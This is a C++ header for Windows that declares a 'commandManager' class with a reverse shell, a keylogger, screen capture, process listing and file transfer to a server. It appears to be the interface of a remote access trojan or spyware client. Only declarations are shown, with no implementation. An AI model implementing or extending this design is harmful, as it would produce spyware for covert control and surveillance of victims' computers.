#pragma once
#include <string>
#include <Windows.h>
#include <map>


class commandManager
{
private:
	std::wstring pidToName(DWORD procID);

public:
	ULONG64 screen_len = 0;
	commandManager();
	std::string reverseShell(std::string cmd);
	std::map<DWORD, std::wstring> getProcessList();
	LPVOID getScreen();
	void getFile(std::string& path, LPCWSTR server);
	void keyLogger();
};

